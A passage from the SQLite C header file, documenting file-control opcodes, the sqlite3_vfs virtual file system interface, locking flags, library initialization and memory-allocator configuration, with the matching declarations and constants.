** <li>[[SQLITE_FCNTL_VFS_POINTER]]
** ^The [SQLITE_FCNTL_VFS_POINTER] opcode finds a pointer to the top-level
** [VFSes] currently in use.  ^(The argument X in
** sqlite3_file_control(db,SQLITE_FCNTL_VFS_POINTER,X) must be
** of type "[sqlite3_vfs] **".  This opcodes will set *X
** to a pointer to the top-level VFS.)^
** ^When there are multiple VFS shims in the stack, this opcode finds the
** upper-most shim only.
**
** <li>[[SQLITE_FCNTL_PRAGMA]]
** ^Whenever a [PRAGMA] statement is parsed, an [SQLITE_FCNTL_PRAGMA] 
** file control is sent to the open [sqlite3_file] object corresponding
** to the database file to which the pragma statement refers. ^The argument
** to the [SQLITE_FCNTL_PRAGMA] file control is an array of
** pointers to strings (char**) in which the second element of the array
** is the name of the pragma and the third element is the argument to the
** pragma or NULL if the pragma has no argument.  ^The handler for an
** [SQLITE_FCNTL_PRAGMA] file control can optionally make the first element
** of the char** argument point to a string obtained from [sqlite3_mprintf()]
** or the equivalent and that string will become the result of the pragma or
** the error message if the pragma fails. ^If the
** [SQLITE_FCNTL_PRAGMA] file control returns [SQLITE_NOTFOUND], then normal 
** [PRAGMA] processing continues.  ^If the [SQLITE_FCNTL_PRAGMA]
** file control returns [SQLITE_OK], then the parser assumes that the
** VFS has handled the PRAGMA itself and the parser generates a no-op
** prepared statement if result string is NULL, or that returns a copy
** of the result string if the string is non-NULL.
** ^If the [SQLITE_FCNTL_PRAGMA] file control returns
** any result code other than [SQLITE_OK] or [SQLITE_NOTFOUND], that means
** that the VFS encountered an error while handling the [PRAGMA] and the
** compilation of the PRAGMA fails with an error.  ^The [SQLITE_FCNTL_PRAGMA]
** file control occurs at the beginning of pragma statement analysis and so
** it is able to override built-in [PRAGMA] statements.
**
** <li>[[SQLITE_FCNTL_BUSYHANDLER]]
** ^The [SQLITE_FCNTL_BUSYHANDLER]
** file-control may be invoked by SQLite on the database file handle
** shortly after it is opened in order to provide a custom VFS with access
** to the connections busy-handler callback. The argument is of type (void **)
** - an array of two (void *) values. The first (void *) actually points
** to a function of type (int (*)(void *)). In order to invoke the connections
** busy-handler, this function should be invoked with the second (void *) in
** the array as the only argument. If it returns non-zero, then the operation
** should be retried. If it returns zero, the custom VFS should abandon the
** current operation.
**
** <li>[[SQLITE_FCNTL_TEMPFILENAME]]
** ^Application can invoke the [SQLITE_FCNTL_TEMPFILENAME] file-control
** to have SQLite generate a
** temporary filename using the same algorithm that is followed to generate
** temporary filenames for TEMP tables and other internal uses.  The
** argument should be a char** which will be filled with the filename
** written into memory obtained from [sqlite3_malloc()].  The caller should
** invoke [sqlite3_free()] on the result to avoid a memory leak.
**
** <li>[[SQLITE_FCNTL_MMAP_SIZE]]
** The [SQLITE_FCNTL_MMAP_SIZE] file control is used to query or set the
** maximum number of bytes that will be used for memory-mapped I/O.
** The argument is a pointer to a value of type sqlite3_int64 that
** is an advisory maximum number of bytes in the file to memory map.  The
** pointer is overwritten with the old value.  The limit is not changed if
** the value originally pointed to is negative, and so the current limit 
** can be queried by passing in a pointer to a negative number.  This
** file-control is used internally to implement [PRAGMA mmap_size].
**
** <li>[[SQLITE_FCNTL_TRACE]]
** The [SQLITE_FCNTL_TRACE] file control provides advisory information
** to the VFS about what the higher layers of the SQLite stack are doing.
** This file control is used by some VFS activity tracing [shims].
** The argument is a zero-terminated string.  Higher layers in the
** SQLite stack may generate instances of this file control if
** the [SQLITE_USE_FCNTL_TRACE] compile-time option is enabled.
**
** <li>[[SQLITE_FCNTL_HAS_MOVED]]
** The [SQLITE_FCNTL_HAS_MOVED] file control interprets its argument as a
** pointer to an integer and it writes a boolean into that integer depending
** on whether or not the file has been renamed, moved, or deleted since it
** was first opened.
**
** <li>[[SQLITE_FCNTL_WIN32_GET_HANDLE]]
** The [SQLITE_FCNTL_WIN32_GET_HANDLE] opcode can be used to obtain the
** underlying native file handle associated with a file handle.  This file
** control interprets its argument as a pointer to a native file handle and
** writes the resulting value there.
**
** <li>[[SQLITE_FCNTL_WIN32_SET_HANDLE]]
** The [SQLITE_FCNTL_WIN32_SET_HANDLE] opcode is used for debugging.  This
** opcode causes the xFileControl method to swap the file handle with the one
** pointed to by the pArg argument.  This capability is used during testing
** and only needs to be supported when SQLITE_TEST is defined.
**
** <li>[[SQLITE_FCNTL_WAL_BLOCK]]
** The [SQLITE_FCNTL_WAL_BLOCK] is a signal to the VFS layer that it might
** be advantageous to block on the next WAL lock if the lock is not immediately
** available.  The WAL subsystem issues this signal during rare
** circumstances in order to fix a problem with priority inversion.
** Applications should <em>not</em> use this file-control.
**
** <li>[[SQLITE_FCNTL_ZIPVFS]]
** The [SQLITE_FCNTL_ZIPVFS] opcode is implemented by zipvfs only. All other
** VFS should return SQLITE_NOTFOUND for this opcode.
**
** <li>[[SQLITE_FCNTL_RBU]]
** The [SQLITE_FCNTL_RBU] opcode is implemented by the special VFS used by
** the RBU extension only.  All other VFS should return SQLITE_NOTFOUND for
** this opcode.  
**
** <li>[[SQLITE_FCNTL_BEGIN_ATOMIC_WRITE]]
** If the [SQLITE_FCNTL_BEGIN_ATOMIC_WRITE] opcode returns SQLITE_OK, then
** the file descriptor is placed in "batch write mode", which
** means all subsequent write operations will be deferred and done
** atomically at the next [SQLITE_FCNTL_COMMIT_ATOMIC_WRITE].  Systems
** that do not support batch atomic writes will return SQLITE_NOTFOUND.
** ^Following a successful SQLITE_FCNTL_BEGIN_ATOMIC_WRITE and prior to
** the closing [SQLITE_FCNTL_COMMIT_ATOMIC_WRITE] or
** [SQLITE_FCNTL_ROLLBACK_ATOMIC_WRITE], SQLite will make
** no VFS interface calls on the same [sqlite3_file] file descriptor
** except for calls to the xWrite method and the xFileControl method
** with [SQLITE_FCNTL_SIZE_HINT].
**
** <li>[[SQLITE_FCNTL_COMMIT_ATOMIC_WRITE]]
** The [SQLITE_FCNTL_COMMIT_ATOMIC_WRITE] opcode causes all write
** operations since the previous successful call to 
** [SQLITE_FCNTL_BEGIN_ATOMIC_WRITE] to be performed atomically.
** This file control returns [SQLITE_OK] if and only if the writes were
** all performed successfully and have been committed to persistent storage.
** ^Regardless of whether or not it is successful, this file control takes
** the file descriptor out of batch write mode so that all subsequent
** write operations are independent.
** ^SQLite will never invoke SQLITE_FCNTL_COMMIT_ATOMIC_WRITE without
** a prior successful call to [SQLITE_FCNTL_BEGIN_ATOMIC_WRITE].
**
** <li>[[SQLITE_FCNTL_ROLLBACK_ATOMIC_WRITE]]
** The [SQLITE_FCNTL_ROLLBACK_ATOMIC_WRITE] opcode causes all write
** operations since the previous successful call to 
** [SQLITE_FCNTL_BEGIN_ATOMIC_WRITE] to be rolled back.
** ^This file control takes the file descriptor out of batch write mode
** so that all subsequent write operations are independent.
** ^SQLite will never invoke SQLITE_FCNTL_ROLLBACK_ATOMIC_WRITE without
** a prior successful call to [SQLITE_FCNTL_BEGIN_ATOMIC_WRITE].
**
** <li>[[SQLITE_FCNTL_LOCK_TIMEOUT]]
** The [SQLITE_FCNTL_LOCK_TIMEOUT] opcode causes attempts to obtain
** a file lock using the xLock or xShmLock methods of the VFS to wait
** for up to M milliseconds before failing, where M is the single 
** unsigned integer parameter.
**
** <li>[[SQLITE_FCNTL_DATA_VERSION]]
** The [SQLITE_FCNTL_DATA_VERSION] opcode is used to detect changes to
** a database file.  The argument is a pointer to a 32-bit unsigned integer.
** The "data version" for the pager is written into the pointer.  The
** "data version" changes whenever any change occurs to the corresponding
** database file, either through SQL statements on the same database
** connection or through transactions committed by separate database
** connections possibly in other processes. The [sqlite3_total_changes()]
** interface can be used to find if any database on the connection has changed,
** but that interface responds to changes on TEMP as well as MAIN and does
** not provide a mechanism to detect changes to MAIN only.  Also, the
** [sqlite3_total_changes()] interface responds to internal changes only and
** omits changes made by other database connections.  The
** [PRAGMA data_version] command provide a mechanism to detect changes to
** a single attached database that occur due to other database connections,
** but omits changes implemented by the database connection on which it is
** called.  This file control is the only mechanism to detect changes that
** happen either internally or externally and that are associated with
** a particular attached database.
** </ul>
*/
#define SQLITE_FCNTL_LOCKSTATE               1
#define SQLITE_FCNTL_GET_LOCKPROXYFILE       2
#define SQLITE_FCNTL_SET_LOCKPROXYFILE       3
#define SQLITE_FCNTL_LAST_ERRNO              4
#define SQLITE_FCNTL_SIZE_HINT               5
#define SQLITE_FCNTL_CHUNK_SIZE              6
#define SQLITE_FCNTL_FILE_POINTER            7
#define SQLITE_FCNTL_SYNC_OMITTED            8
#define SQLITE_FCNTL_WIN32_AV_RETRY          9
#define SQLITE_FCNTL_PERSIST_WAL            10
#define SQLITE_FCNTL_OVERWRITE              11
#define SQLITE_FCNTL_VFSNAME                12
#define SQLITE_FCNTL_POWERSAFE_OVERWRITE    13
#define SQLITE_FCNTL_PRAGMA                 14
#define SQLITE_FCNTL_BUSYHANDLER            15
#define SQLITE_FCNTL_TEMPFILENAME           16
#define SQLITE_FCNTL_MMAP_SIZE              18
#define SQLITE_FCNTL_TRACE                  19
#define SQLITE_FCNTL_HAS_MOVED              20
#define SQLITE_FCNTL_SYNC                   21
#define SQLITE_FCNTL_COMMIT_PHASETWO        22
#define SQLITE_FCNTL_WIN32_SET_HANDLE       23
#define SQLITE_FCNTL_WAL_BLOCK              24
#define SQLITE_FCNTL_ZIPVFS                 25
#define SQLITE_FCNTL_RBU                    26
#define SQLITE_FCNTL_VFS_POINTER            27
#define SQLITE_FCNTL_JOURNAL_POINTER        28
#define SQLITE_FCNTL_WIN32_GET_HANDLE       29
#define SQLITE_FCNTL_PDB                    30
#define SQLITE_FCNTL_BEGIN_ATOMIC_WRITE     31
#define SQLITE_FCNTL_COMMIT_ATOMIC_WRITE    32
#define SQLITE_FCNTL_ROLLBACK_ATOMIC_WRITE  33
#define SQLITE_FCNTL_LOCK_TIMEOUT           34
#define SQLITE_FCNTL_DATA_VERSION           35
#define SQLITE_FCNTL_SIZE_LIMIT             36

/* deprecated names */
#define SQLITE_GET_LOCKPROXYFILE      SQLITE_FCNTL_GET_LOCKPROXYFILE
#define SQLITE_SET_LOCKPROXYFILE      SQLITE_FCNTL_SET_LOCKPROXYFILE
#define SQLITE_LAST_ERRNO             SQLITE_FCNTL_LAST_ERRNO


/*
** CAPI3REF: Mutex Handle
**
** The mutex module within SQLite defines [sqlite3_mutex] to be an
** abstract type for a mutex object.  The SQLite core never looks
** at the internal representation of an [sqlite3_mutex].  It only
** deals with pointers to the [sqlite3_mutex] object.
**
** Mutexes are created using [sqlite3_mutex_alloc()].
*/
typedef struct sqlite3_mutex sqlite3_mutex;

/*
** CAPI3REF: Loadable Extension Thunk
**
** A pointer to the opaque sqlite3_api_routines structure is passed as
** the third parameter to entry points of [loadable extensions].  This
** structure must be typedefed in order to work around compiler warnings
** on some platforms.
*/
typedef struct sqlite3_api_routines sqlite3_api_routines;

/*
** CAPI3REF: OS Interface Object
**
** An instance of the sqlite3_vfs object defines the interface between
** the SQLite core and the underlying operating system.  The "vfs"
** in the name of the object stands for "virtual file system".  See
** the [VFS | VFS documentation] for further information.
**
** The VFS interface is sometimes extended by adding new methods onto
** the end.  Each time such an extension occurs, the iVersion field
** is incremented.  The iVersion value started out as 1 in
** SQLite [version 3.5.0] on [dateof:3.5.0], then increased to 2
** with SQLite [version 3.7.0] on [dateof:3.7.0], and then increased
** to 3 with SQLite [version 3.7.6] on [dateof:3.7.6].  Additional fields
** may be appended to the sqlite3_vfs object and the iVersion value
** may increase again in future versions of SQLite.
** Note that the structure
** of the sqlite3_vfs object changes in the transition from
** SQLite [version 3.5.9] to [version 3.6.0] on [dateof:3.6.0]
** and yet the iVersion field was not modified.
**
** The szOsFile field is the size of the subclassed [sqlite3_file]
** structure used by this VFS.  mxPathname is the maximum length of
** a pathname in this VFS.
**
** Registered sqlite3_vfs objects are kept on a linked list formed by
** the pNext pointer.  The [sqlite3_vfs_register()]
** and [sqlite3_vfs_unregister()] interfaces manage this list
** in a thread-safe way.  The [sqlite3_vfs_find()] interface
** searches the list.  Neither the application code nor the VFS
** implementation should use the pNext pointer.
**
** The pNext field is the only field in the sqlite3_vfs
** structure that SQLite will ever modify.  SQLite will only access
** or modify this field while holding a particular static mutex.
** The application should never modify anything within the sqlite3_vfs
** object once the object has been registered.
**
** The zName field holds the name of the VFS module.  The name must
** be unique across all VFS modules.
**
** [[sqlite3_vfs.xOpen]]
** ^SQLite guarantees that the zFilename parameter to xOpen
** is either a NULL pointer or string obtained
** from xFullPathname() with an optional suffix added.
** ^If a suffix is added to the zFilename parameter, it will
** consist of a single "-" character followed by no more than
** 11 alphanumeric and/or "-" characters.
** ^SQLite further guarantees that
** the string will be valid and unchanged until xClose() is
** called. Because of the previous sentence,
** the [sqlite3_file] can safely store a pointer to the
** filename if it needs to remember the filename for some reason.
** If the zFilename parameter to xOpen is a NULL pointer then xOpen
** must invent its own temporary name for the file.  ^Whenever the 
** xFilename parameter is NULL it will also be the case that the
** flags parameter will include [SQLITE_OPEN_DELETEONCLOSE].
**
** The flags argument to xOpen() includes all bits set in
** the flags argument to [sqlite3_open_v2()].  Or if [sqlite3_open()]
** or [sqlite3_open16()] is used, then flags includes at least
** [SQLITE_OPEN_READWRITE] | [SQLITE_OPEN_CREATE]. 
** If xOpen() opens a file read-only then it sets *pOutFlags to
** include [SQLITE_OPEN_READONLY].  Other bits in *pOutFlags may be set.
**
** ^(SQLite will also add one of the following flags to the xOpen()
** call, depending on the object being opened:
**
** <ul>
** <li>  [SQLITE_OPEN_MAIN_DB]
** <li>  [SQLITE_OPEN_MAIN_JOURNAL]
** <li>  [SQLITE_OPEN_TEMP_DB]
** <li>  [SQLITE_OPEN_TEMP_JOURNAL]
** <li>  [SQLITE_OPEN_TRANSIENT_DB]
** <li>  [SQLITE_OPEN_SUBJOURNAL]
** <li>  [SQLITE_OPEN_MASTER_JOURNAL]
** <li>  [SQLITE_OPEN_WAL]
** </ul>)^
**
** The file I/O implementation can use the object type flags to
** change the way it deals with files.  For example, an application
** that does not care about crash recovery or rollback might make
** the open of a journal file a no-op.  Writes to this journal would
** also be no-ops, and any attempt to read the journal would return
** SQLITE_IOERR.  Or the implementation might recognize that a database
** file will be doing page-aligned sector reads and writes in a random
** order and set up its I/O subsystem accordingly.
**
** SQLite might also add one of the following flags to the xOpen method:
**
** <ul>
** <li> [SQLITE_OPEN_DELETEONCLOSE]
** <li> [SQLITE_OPEN_EXCLUSIVE]
** </ul>
**
** The [SQLITE_OPEN_DELETEONCLOSE] flag means the file should be
** deleted when it is closed.  ^The [SQLITE_OPEN_DELETEONCLOSE]
** will be set for TEMP databases and their journals, transient
** databases, and subjournals.
**
** ^The [SQLITE_OPEN_EXCLUSIVE] flag is always used in conjunction
** with the [SQLITE_OPEN_CREATE] flag, which are both directly
** analogous to the O_EXCL and O_CREAT flags of the POSIX open()
** API.  The SQLITE_OPEN_EXCLUSIVE flag, when paired with the 
** SQLITE_OPEN_CREATE, is used to indicate that file should always
** be created, and that it is an error if it already exists.
** It is <i>not</i> used to indicate the file should be opened 
** for exclusive access.
**
** ^At least szOsFile bytes of memory are allocated by SQLite
** to hold the  [sqlite3_file] structure passed as the third
** argument to xOpen.  The xOpen method does not have to
** allocate the structure; it should just fill it in.  Note that
** the xOpen method must set the sqlite3_file.pMethods to either
** a valid [sqlite3_io_methods] object or to NULL.  xOpen must do
** this even if the open fails.  SQLite expects that the sqlite3_file.pMethods
** element will be valid after xOpen returns regardless of the success
** or failure of the xOpen call.
**
** [[sqlite3_vfs.xAccess]]
** ^The flags argument to xAccess() may be [SQLITE_ACCESS_EXISTS]
** to test for the existence of a file, or [SQLITE_ACCESS_READWRITE] to
** test whether a file is readable and writable, or [SQLITE_ACCESS_READ]
** to test whether a file is at least readable.  The SQLITE_ACCESS_READ
** flag is never actually used and is not implemented in the built-in
** VFSes of SQLite.  The file is named by the second argument and can be a
** directory. The xAccess method returns [SQLITE_OK] on success or some
** non-zero error code if there is an I/O error or if the name of
** the file given in the second argument is illegal.  If SQLITE_OK
** is returned, then non-zero or zero is written into *pResOut to indicate
** whether or not the file is accessible.  
**
** ^SQLite will always allocate at least mxPathname+1 bytes for the
** output buffer xFullPathname.  The exact size of the output buffer
** is also passed as a parameter to both  methods. If the output buffer
** is not large enough, [SQLITE_CANTOPEN] should be returned. Since this is
** handled as a fatal error by SQLite, vfs implementations should endeavor
** to prevent this by setting mxPathname to a sufficiently large value.
**
** The xRandomness(), xSleep(), xCurrentTime(), and xCurrentTimeInt64()
** interfaces are not strictly a part of the filesystem, but they are
** included in the VFS structure for completeness.
** The xRandomness() function attempts to return nBytes bytes
** of good-quality randomness into zOut.  The return value is
** the actual number of bytes of randomness obtained.
** The xSleep() method causes the calling thread to sleep for at
** least the number of microseconds given.  ^The xCurrentTime()
** method returns a Julian Day Number for the current date and time as
** a floating point value.
** ^The xCurrentTimeInt64() method returns, as an integer, the Julian
** Day Number multiplied by 86400000 (the number of milliseconds in 
** a 24-hour day).  
** ^SQLite will use the xCurrentTimeInt64() method to get the current
** date and time if that method is available (if iVersion is 2 or 
** greater and the function pointer is not NULL) and will fall back
** to xCurrentTime() if xCurrentTimeInt64() is unavailable.
**
** ^The xSetSystemCall(), xGetSystemCall(), and xNestSystemCall() interfaces
** are not used by the SQLite core.  These optional interfaces are provided
** by some VFSes to facilitate testing of the VFS code. By overriding 
** system calls with functions under its control, a test program can
** simulate faults and error conditions that would otherwise be difficult
** or impossible to induce.  The set of system calls that can be overridden
** varies from one VFS to another, and from one version of the same VFS to the
** next.  Applications that use these interfaces must be prepared for any
** or all of these interfaces to be NULL or for their behavior to change
** from one release to the next.  Applications must not attempt to access
** any of these methods if the iVersion of the VFS is less than 3.
*/
typedef struct sqlite3_vfs sqlite3_vfs;
typedef void (*sqlite3_syscall_ptr)(void);
struct sqlite3_vfs {
  int iVersion;            /* Structure version number (currently 3) */
  int szOsFile;            /* Size of subclassed sqlite3_file */
  int mxPathname;          /* Maximum file pathname length */
  sqlite3_vfs *pNext;      /* Next registered VFS */
  const char *zName;       /* Name of this virtual file system */
  void *pAppData;          /* Pointer to application-specific data */
  int (*xOpen)(sqlite3_vfs*, const char *zName, sqlite3_file*,
               int flags, int *pOutFlags);
  int (*xDelete)(sqlite3_vfs*, const char *zName, int syncDir);
  int (*xAccess)(sqlite3_vfs*, const char *zName, int flags, int *pResOut);
  int (*xFullPathname)(sqlite3_vfs*, const char *zName, int nOut, char *zOut);
  void *(*xDlOpen)(sqlite3_vfs*, const char *zFilename);
  void (*xDlError)(sqlite3_vfs*, int nByte, char *zErrMsg);
  void (*(*xDlSym)(sqlite3_vfs*,void*, const char *zSymbol))(void);
  void (*xDlClose)(sqlite3_vfs*, void*);
  int (*xRandomness)(sqlite3_vfs*, int nByte, char *zOut);
  int (*xSleep)(sqlite3_vfs*, int microseconds);
  int (*xCurrentTime)(sqlite3_vfs*, double*);
  int (*xGetLastError)(sqlite3_vfs*, int, char *);
  /*
  ** The methods above are in version 1 of the sqlite_vfs object
  ** definition.  Those that follow are added in version 2 or later
  */
  int (*xCurrentTimeInt64)(sqlite3_vfs*, sqlite3_int64*);
  /*
  ** The methods above are in versions 1 and 2 of the sqlite_vfs object.
  ** Those below are for version 3 and greater.
  */
  int (*xSetSystemCall)(sqlite3_vfs*, const char *zName, sqlite3_syscall_ptr);
  sqlite3_syscall_ptr (*xGetSystemCall)(sqlite3_vfs*, const char *zName);
  const char *(*xNextSystemCall)(sqlite3_vfs*, const char *zName);
  /*
  ** The methods above are in versions 1 through 3 of the sqlite_vfs object.
  ** New fields may be appended in future versions.  The iVersion
  ** value will increment whenever this happens. 
  */
};

/*
** CAPI3REF: Flags for the xAccess VFS method
**
** These integer constants can be used as the third parameter to
** the xAccess method of an [sqlite3_vfs] object.  They determine
** what kind of permissions the xAccess method is looking for.
** With SQLITE_ACCESS_EXISTS, the xAccess method
** simply checks whether the file exists.
** With SQLITE_ACCESS_READWRITE, the xAccess method
** checks whether the named directory is both readable and writable
** (in other words, if files can be added, removed, and renamed within
** the directory).
** The SQLITE_ACCESS_READWRITE constant is currently used only by the
** [temp_store_directory pragma], though this could change in a future
** release of SQLite.
** With SQLITE_ACCESS_READ, the xAccess method
** checks whether the file is readable.  The SQLITE_ACCESS_READ constant is
** currently unused, though it might be used in a future release of
** SQLite.
*/
#define SQLITE_ACCESS_EXISTS    0
#define SQLITE_ACCESS_READWRITE 1   /* Used by PRAGMA temp_store_directory */
#define SQLITE_ACCESS_READ      2   /* Unused */

/*
** CAPI3REF: Flags for the xShmLock VFS method
**
** These integer constants define the various locking operations
** allowed by the xShmLock method of [sqlite3_io_methods].  The
** following are the only legal combinations of flags to the
** xShmLock method:
**
** <ul>
** <li>  SQLITE_SHM_LOCK | SQLITE_SHM_SHARED
** <li>  SQLITE_SHM_LOCK | SQLITE_SHM_EXCLUSIVE
** <li>  SQLITE_SHM_UNLOCK | SQLITE_SHM_SHARED
** <li>  SQLITE_SHM_UNLOCK | SQLITE_SHM_EXCLUSIVE
** </ul>
**
** When unlocking, the same SHARED or EXCLUSIVE flag must be supplied as
** was given on the corresponding lock.  
**
** The xShmLock method can transition between unlocked and SHARED or
** between unlocked and EXCLUSIVE.  It cannot transition between SHARED
** and EXCLUSIVE.
*/
#define SQLITE_SHM_UNLOCK       1
#define SQLITE_SHM_LOCK         2
#define SQLITE_SHM_SHARED       4
#define SQLITE_SHM_EXCLUSIVE    8

/*
** CAPI3REF: Maximum xShmLock index
**
** The xShmLock method on [sqlite3_io_methods] may use values
** between 0 and this upper bound as its "offset" argument.
** The SQLite core will never attempt to acquire or release a
** lock outside of this range
*/
#define SQLITE_SHM_NLOCK        8


/*
** CAPI3REF: Initialize The SQLite Library
**
** ^The sqlite3_initialize() routine initializes the
** SQLite library.  ^The sqlite3_shutdown() routine
** deallocates any resources that were allocated by sqlite3_initialize().
** These routines are designed to aid in process initialization and
** shutdown on embedded systems.  Workstation applications using
** SQLite normally do not need to invoke either of these routines.
**
** A call to sqlite3_initialize() is an "effective" call if it is
** the first time sqlite3_initialize() is invoked during the lifetime of
** the process, or if it is the first time sqlite3_initialize() is invoked
** following a call to sqlite3_shutdown().  ^(Only an effective call
** of sqlite3_initialize() does any initialization.  All other calls
** are harmless no-ops.)^
**
** A call to sqlite3_shutdown() is an "effective" call if it is the first
** call to sqlite3_shutdown() since the last sqlite3_initialize().  ^(Only
** an effective call to sqlite3_shutdown() does any deinitialization.
** All other valid calls to sqlite3_shutdown() are harmless no-ops.)^
**
** The sqlite3_initialize() interface is threadsafe, but sqlite3_shutdown()
** is not.  The sqlite3_shutdown() interface must only be called from a
** single thread.  All open [database connections] must be closed and all
** other SQLite resources must be deallocated prior to invoking
** sqlite3_shutdown().
**
** Among other things, ^sqlite3_initialize() will invoke
** sqlite3_os_init().  Similarly, ^sqlite3_shutdown()
** will invoke sqlite3_os_end().
**
** ^The sqlite3_initialize() routine returns [SQLITE_OK] on success.
** ^If for some reason, sqlite3_initialize() is unable to initialize
** the library (perhaps it is unable to allocate a needed resource such
** as a mutex) it returns an [error code] other than [SQLITE_OK].
**
** ^The sqlite3_initialize() routine is called internally by many other
** SQLite interfaces so that an application usually does not need to
** invoke sqlite3_initialize() directly.  For example, [sqlite3_open()]
** calls sqlite3_initialize() so the SQLite library will be automatically
** initialized when [sqlite3_open()] is called if it has not be initialized
** already.  ^However, if SQLite is compiled with the [SQLITE_OMIT_AUTOINIT]
** compile-time option, then the automatic calls to sqlite3_initialize()
** are omitted and the application must call sqlite3_initialize() directly
** prior to using any other SQLite interface.  For maximum portability,
** it is recommended that applications always invoke sqlite3_initialize()
** directly prior to using any other SQLite interface.  Future releases
** of SQLite may require this.  In other words, the behavior exhibited
** when SQLite is compiled with [SQLITE_OMIT_AUTOINIT] might become the
** default behavior in some future release of SQLite.
**
** The sqlite3_os_init() routine does operating-system specific
** initialization of the SQLite library.  The sqlite3_os_end()
** routine undoes the effect of sqlite3_os_init().  Typical tasks
** performed by these routines include allocation or deallocation
** of static resources, initialization of global variables,
** setting up a default [sqlite3_vfs] module, or setting up
** a default configuration using [sqlite3_config()].
**
** The application should never invoke either sqlite3_os_init()
** or sqlite3_os_end() directly.  The application should only invoke
** sqlite3_initialize() and sqlite3_shutdown().  The sqlite3_os_init()
** interface is called automatically by sqlite3_initialize() and
** sqlite3_os_end() is called by sqlite3_shutdown().  Appropriate
** implementations for sqlite3_os_init() and sqlite3_os_end()
** are built into SQLite when it is compiled for Unix, Windows, or OS/2.
** When [custom builds | built for other platforms]
** (using the [SQLITE_OS_OTHER=1] compile-time
** option) the application must supply a suitable implementation for
** sqlite3_os_init() and sqlite3_os_end().  An application-supplied
** implementation of sqlite3_os_init() or sqlite3_os_end()
** must return [SQLITE_OK] on success and some other [error code] upon
** failure.
*/
SQLITE_API int sqlite3_initialize(void);
SQLITE_API int sqlite3_shutdown(void);
SQLITE_API int sqlite3_os_init(void);
SQLITE_API int sqlite3_os_end(void);

/*
** CAPI3REF: Configuring The SQLite Library
**
** The sqlite3_config() interface is used to make global configuration
** changes to SQLite in order to tune SQLite to the specific needs of
** the application.  The default configuration is recommended for most
** applications and so this routine is usually not necessary.  It is
** provided to support rare applications with unusual needs.
**
** <b>The sqlite3_config() interface is not threadsafe. The application
** must ensure that no other SQLite interfaces are invoked by other
** threads while sqlite3_config() is running.</b>
**
** The sqlite3_config() interface
** may only be invoked prior to library initialization using
** [sqlite3_initialize()] or after shutdown by [sqlite3_shutdown()].
** ^If sqlite3_config() is called after [sqlite3_initialize()] and before
** [sqlite3_shutdown()] then it will return SQLITE_MISUSE.
** Note, however, that ^sqlite3_config() can be called as part of the
** implementation of an application-defined [sqlite3_os_init()].
**
** The first argument to sqlite3_config() is an integer
** [configuration option] that determines
** what property of SQLite is to be configured.  Subsequent arguments
** vary depending on the [configuration option]
** in the first argument.
**
** ^When a configuration option is set, sqlite3_config() returns [SQLITE_OK].
** ^If the option is unknown or SQLite is unable to set the option
** then this routine returns a non-zero [error code].
*/
SQLITE_API int sqlite3_config(int, ...);

/*
** CAPI3REF: Configure database connections
** METHOD: sqlite3
**
** The sqlite3_db_config() interface is used to make configuration
** changes to a [database connection].  The interface is similar to
** [sqlite3_config()] except that the changes apply to a single
** [database connection] (specified in the first argument).
**
** The second argument to sqlite3_db_config(D,V,...)  is the
** [SQLITE_DBCONFIG_LOOKASIDE | configuration verb] - an integer code 
** that indicates what aspect of the [database connection] is being configured.
** Subsequent arguments vary depending on the configuration verb.
**
** ^Calls to sqlite3_db_config() return SQLITE_OK if and only if
** the call is considered successful.
*/
SQLITE_API int sqlite3_db_config(sqlite3*, int op, ...);

/*
** CAPI3REF: Memory Allocation Routines
**
** An instance of this object defines the interface between SQLite
** and low-level memory allocation routines.
**
** This object is used in only one place in the SQLite interface.
** A pointer to an instance of this object is the argument to
** [sqlite3_config()] when the configuration option is
** [SQLITE_CONFIG_MALLOC] or [SQLITE_CONFIG_GETMALLOC].  
** By creating an instance of this object
** and passing it to [sqlite3_config]([SQLITE_CONFIG_MALLOC])
** during configuration, an application can specify an alternative
** memory allocation subsystem for SQLite to use for all of its
** dynamic memory needs.
**
** Note that SQLite comes with several [built-in memory allocators]
** that are perfectly adequate for the overwhelming majority of applications
** and that this object is only useful to a tiny minority of applications
** with specialized memory allocation requirements.  This object is
** also used during testing of SQLite in order to specify an alternative
** memory allocator that simulates memory out-of-memory conditions in
** order to verify that SQLite recovers gracefully from such
** conditions.
**
** The xMalloc, xRealloc, and xFree methods must work like the
** malloc(), realloc() and free() functions from the standard C library.
** ^SQLite guarantees that the second argument to
** xRealloc is always a value returned by a prior call to xRoundup.
**
** xSize should return the allocated size of a memory allocation
** previously obtained from xMalloc or xRealloc.  The allocated size
** is always at least as big as the requested size but may be larger.
**
** The xRoundup method returns what would be the allocated size of
** a memory allocation given a particular requested size.  Most memory
** allocators round up memory allocations at least to the next multiple
** of 8.  Some allocators round up to a larger multiple or to a power of 2.
** Every memory allocation request coming in through [sqlite3_malloc()]
** or [sqlite3_realloc()] first calls xRoundup.  If xRoundup returns 0, 
** that causes the corresponding memory allocation to fail.
**
** The xInit method initializes the memory allocator.  For example,
** it might allocate any require mutexes or initialize internal data
** structures.  The xShutdown method is invoked (indirectly) by
** [sqlite3_shutdown()] and should deallocate any resources acquired
** by xInit.  The pAppData pointer is used as the only parameter to
** xInit and xShutdown.
**
** SQLite holds the [SQLITE_MUTEX_STATIC_MASTER] mutex when it invokes
** the xInit method, so the xInit method need not be threadsafe.  The
** xShutdown method is only called from [sqlite3_shutdown()] so it does
** not need to be threadsafe either.  For all other methods, SQLite
** holds the [SQLITE_MUTEX_STATIC_MEM] mutex as long as the
** [SQLITE_CONFIG_MEMSTATUS] configuration option is turned on (which
** it is by default) and so the methods are automatically serialized.
** However, if [SQLITE_CONFIG_MEMSTATUS] is disabled, then the other
** methods must be threadsafe or else make their own arrangements for
** serialization.
**
** SQLite will never invoke xInit() more than once without an intervening
** call to xShutdown().
*/
typedef struct sqlite3_mem_methods sqlite3_mem_methods;
struct sqlite3_mem_methods {
  void *(*xMalloc)(int);         /* Memory allocation function */
  void (*xFree)(void*);          /* Free a prior allocation */
  void *(*xRealloc)(void*,int);  /* Resize an allocation */
  int (*xSize)(void*);           /* Return the size of an allocation */
  int (*xRoundup)(int);          /* Round up request size to allocation size */
  int (*xInit)(void*);           /* Initialize the memory allocator */
  void (*xShutdown)(void*);      /* Deinitialize the memory allocator */
  void *pAppData;                /* Argument to xInit() and xShutdown() */
};

/*
** CAPI3REF: Configuration Options
** KEYWORDS: {configuration option}
**
** These constants are the available integer configuration options that
** can be passed as the first argument to the [sqlite3_config()] interface.
**
** New configuration options may be added in future releases of SQLite.
** Existing configuration options might be discontinued.  Applications
** should check the return code from [sqlite3_config()] to make sure that
